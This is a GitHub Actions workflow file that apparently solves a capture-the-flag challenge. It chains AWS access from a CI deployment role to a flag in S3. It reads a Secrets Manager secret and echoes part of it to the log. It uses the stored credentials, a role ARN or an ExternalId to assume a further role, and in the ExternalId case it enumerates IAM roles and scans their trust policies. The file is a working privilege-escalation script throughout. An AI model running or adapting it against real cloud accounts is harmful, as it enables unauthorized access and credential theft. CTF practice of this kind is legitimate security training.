name: hexnova-final
on:
  workflow_dispatch:

jobs:
  retrace:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest

    env:
      AWS_REGION: us-west-2
      BUCKET: atr3404-63428fb6

    steps:
      - name: Show runner & AWS CLI
        run: |
          set -x
          uname -a || true
          aws --version || true

      - name: Configure AWS via OIDC (first hop)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
          aws-region: ${{ env.AWS_REGION }}
          role-session-name: ctf-hexnova

      - name: Verify caller
        run: aws sts get-caller-identity --output json

      - name: Install jq
        run: sudo apt-get update && sudo apt-get install -y jq

      - name: Fetch next-hop secret
        run: |
          set -euo pipefail
          aws secretsmanager get-secret-value \
            --secret-id internal/secrets/id-v2 \
            --region "${AWS_REGION}" \
            --output json > secret_resp.json

          # Pull raw SecretString
          jq -r '.SecretString' secret_resp.json > secret_raw.txt

          # Try base64-decode -> if it decodes, use it; else keep as-is
          if base64 -d < secret_raw.txt >/tmp/dec 2>/dev/null; then
            cp /tmp/dec secret_stage1.txt
          else
            cp secret_raw.txt secret_stage1.txt
          fi

          # If it’s JSON *string* of JSON, unwrap once/twice; else keep as object/text
          cat secret_stage1.txt | jq -c 'try (fromjson) catch .' > secret_stage2.json
          cat secret_stage2.json | jq -c 'try (fromjson) catch .' > secret.json

          echo "Secret (preview first 200 chars):"
          head -c 200 secret.json || true; echo

      - name: Decide secret type
        id: classify
        run: |
          if jq -e '.AccessKeyId and .SecretAccessKey and .SessionToken' secret.json >/dev/null 2>&1; then
            echo "value=creds" >> "$GITHUB_OUTPUT"
          elif jq -e '.RoleArn' secret.json >/dev/null 2>&1; then
            echo "value=role" >> "$GITHUB_OUTPUT"
          elif jq -e '.external_id or .ExternalId' secret.json >/dev/null 2>&1; then
            echo "value=extid" >> "$GITHUB_OUTPUT"
          else
            echo "::error::Unknown secret shape"; exit 1
          fi

      - name: Use STS creds directly
        if: steps.classify.outputs.value == 'creds'
        run: |
          export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId secret.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey secret.json)
          export AWS_SESSION_TOKEN=$(jq -r .SessionToken secret.json)
          aws sts get-caller-identity --output json
          aws s3 cp "s3://${BUCKET}/flag.txt" - --region "${AWS_REGION}"

      - name: Assume next role from secret (with optional ExternalId)
        if: steps.classify.outputs.value == 'role'
        run: |
          ROLE=$(jq -r '.RoleArn' secret.json)
          EXT=$(jq -r '.ExternalId // .external_id // empty' secret.json)
          echo "Detected ROLE: $ROLE"
          [ -z "$ROLE" ] && { echo "::error::Empty RoleArn in secret"; exit 1; }

          if [ -n "$EXT" ]; then
            aws sts assume-role \
              --role-arn "$ROLE" \
              --role-session-name ctf-hexnova-priv \
              --external-id "$EXT" \
              --region "${AWS_REGION}" \
              --output json > assume.json
          else
            aws sts assume-role \
              --role-arn "$ROLE" \
              --role-session-name ctf-hexnova-priv \
              --region "${AWS_REGION}" \
              --output json > assume.json
          fi

          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)

          aws sts get-caller-identity --output json
          aws s3 cp "s3://${BUCKET}/flag.txt" - --region "${AWS_REGION}"

      - name: Discover role by ExternalId, assume, and fetch flag
        if: steps.classify.outputs.value == 'extid'
        run: |
          set -euo pipefail
          EXT=$(jq -r '.external_id // .ExternalId' secret.json)
          echo "Using ExternalId: $EXT"

          # List roles (CTF account allows this). If it fails, we’ll raise an error.
          aws iam list-roles --output json > roles.json

          DETECTED_ROLE=""
          for RN in $(jq -r '.Roles[].RoleName' roles.json); do
            # Pull trust policy and search anywhere for "sts:ExternalId": "$EXT"
            ARN=$(aws iam get-role --role-name "$RN" --output json \
              | jq -er --arg EXT "$EXT" '
                .Role as $r
                | ($r.AssumeRolePolicyDocument
                   | (.. | objects | .["sts:ExternalId"]? | select(. == $EXT))
                  )
                | $r.Arn
              ' 2>/dev/null || true)

            if [ -n "${ARN:-}" ]; then
              DETECTED_ROLE="$ARN"
              echo "Detected ROLE: $DETECTED_ROLE"
              break
            fi
          done

          if [ -z "$DETECTED_ROLE" ]; then
            echo "::error::Could not find a role with ExternalId=$EXT"; 
            echo "First 200 chars of a sample trust policy for debugging:"
            aws iam get-role --role-name "$(jq -r '.Roles[0].RoleName' roles.json)" --output json \
              | jq -r '.Role.AssumeRolePolicyDocument' | head -c 200 || true; echo
            exit 1
          fi

          aws sts assume-role \
            --role-arn "$DETECTED_ROLE" \
            --role-session-name ctf-hexnova-priv \
            --external-id "$EXT" \
            --region "${AWS_REGION}" \
            --output json > assume.json

          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)

          aws sts get-caller-identity --output json
          aws s3 cp "s3://${BUCKET}/flag.txt" - --region "${AWS_REGION}"

